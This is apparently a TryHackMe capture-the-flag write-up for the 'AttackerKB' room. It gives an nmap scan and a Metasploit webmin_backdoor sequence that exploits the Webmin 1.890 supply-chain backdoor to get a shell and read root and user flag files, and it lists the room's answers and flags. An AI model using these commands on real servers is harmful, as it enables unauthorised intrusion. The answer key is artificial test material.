# THM - AttackerKB

<br>

🔖 https://attackerkb.com/

<br>

## Task 2

### Task 2.2

```shell
nmap -sV -sC -vv -oA scans/initial 10.10.79.75
```

> Webmin

### Task 2.3

> 1.890

### Task 2.4

> source

<br>

## Task 3

https://attackerkb.com/topics/hxx3zmiCkR/webmin-password-change-cgi-command-injection

### Task 3.3

> 1.890

### Task 3.4

> Supply Chain

### Task 3.5

> August 17th 2019

### Task 3.6

> August 17th 2019

<br>

## Task 4

```shell
msfconsole
	search webmin_backdoor	
	use 0
		
		show options
		set RHOSTS 10.10.79.75
		set LHOST tun0		# tun0 vs eth0 (VPN)
		set SSL true
		
		run
			whoami
			
			cat /root/root.txt
			
			cat /home/dark/user.txt
```

### Task 4.3

> ssl

### Task 4.4

> THM{SUPPLY_CHAIN_COMPROMISE}

### Task 4.5

> THM{UPDATE_YOUR_INSTALL}



